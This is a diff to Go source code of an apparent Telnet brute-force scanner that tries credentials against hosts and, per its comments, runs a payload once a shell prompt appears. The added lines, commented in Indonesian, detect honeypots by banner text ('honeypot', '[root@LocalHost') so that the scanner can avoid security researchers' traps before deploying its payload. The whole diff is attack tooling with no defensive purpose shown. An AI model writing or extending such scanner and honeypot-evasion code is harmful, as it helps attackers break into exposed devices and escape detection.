@@ -206,7 +206,7 @@ func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interfa
 	}
 
 	startTime := time.Now()
-	for !promptCheck(data, loginPrompts...) {
+    for !promptCheck(data, loginPrompts...) {
 		if time.Since(startTime) > TELNET_TIMEOUT {
 			return false, "login prompt timeout"
 		}
@@ -217,6 +217,12 @@ func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interfa
 			continue
 		}
 		data = append(data, buf[:n]...)
+
+        // Anti-honeypot via banner: jika banner mengandung kata honeypot/honeypots
+        lowerData := bytes.ToLower(data)
+        if bytes.Contains(lowerData, []byte("honeypot")) || bytes.Contains(lowerData, []byte("honeypots")) {
+            return true, CredentialResult{Host: host, Username: username, Password: password, Output: string(data), Honeypot: true}
+        }
 	}
 	conn.Write([]byte(username + "\n"))
 
@@ -245,7 +251,12 @@ func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interfa
 			continue
 		}
 		data = append(data, buf[:n]...)
-		if promptCheck(data, shellPrompts...) {
+        if promptCheck(data, shellPrompts...) {
+            // Banner khusus yang harus di-skip bila sudah login (contoh: [root@LocalHost tmp]$)
+            if bytes.Contains(data, []byte("[root@LocalHost tmp]$")) || bytes.Contains(data, []byte("[root@LocalHost")) {
+                return true, CredentialResult{Host: host, Username: username, Password: password, Output: string(data), Honeypot: true}
+            }
+
             // Deteksi honeypot sebelum menjalankan payload
             isHP, hpOutput, _ := s.detectHoneypot(conn)
             if isHP {
